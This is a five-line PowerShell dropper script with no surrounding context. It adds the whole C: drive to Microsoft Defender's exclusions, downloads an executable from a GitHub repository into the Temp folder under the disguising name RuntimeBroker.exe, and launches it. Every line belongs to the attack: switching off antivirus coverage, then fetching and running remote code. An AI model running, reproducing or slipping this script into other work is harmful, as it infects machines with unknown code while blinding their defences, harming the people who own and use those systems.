Add-MpPreference -ExclusionPath C:\
$url = "https://github.com/AnonAm0369/am/raw/refs/heads/main/RuntimeBroker.exe"
$output = "$env:Temp/RuntimeBroker.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output